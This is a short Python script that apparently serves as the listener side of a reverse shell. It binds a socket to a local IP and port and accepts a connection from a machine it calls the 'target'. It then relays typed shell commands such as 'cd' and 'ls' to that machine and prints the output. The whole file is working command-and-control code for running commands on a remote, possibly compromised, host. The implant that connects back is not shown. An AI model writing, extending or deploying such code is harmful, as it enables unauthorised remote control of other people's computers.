import socket 

port = 3490
host_ip = "192.168.1.32"
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
current_dir = ""

def send_command():
    print("You can now enter commands to send")
    while 1:
        command = input(">>> ")
        if command == "":
            continue
        elif command == "quit":
            target.send(command.encode('utf-8'))
            print("Exiting...")
            sock.close()
            break
        elif command[:2] == "cd":
            target.send(command.encode('utf-8'))
            output = target.recv(4096).decode('utf-8')
            print(output)
            continue
        elif command[:2] == "ls" and len(command) > 1:
            target.send(command.encode('utf-8'))
            output = target.recv(4096).decode('utf-8')
            print(output)
        else:
            target.send(command.encode('utf-8'))
            result = target.recv(4096)
            print(result.decode('utf-8'))


def server_init():
    global target
    # global current_dir
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host_ip, port))
    # listen, maximum 10 incoming connections allowed in queue
    sock.listen(10)
    print("Listening for incoming connections")
    # accept returns a socket object that can be used to send/recv to/from remote end
    # also returns address and port bound to the remote end 
    target, ip = sock.accept()
    print(f"Connected with {str(ip)}")
    # current_dir = target.recv(1024).decode('utf-8')
    # sock.close()


server_init()
send_command()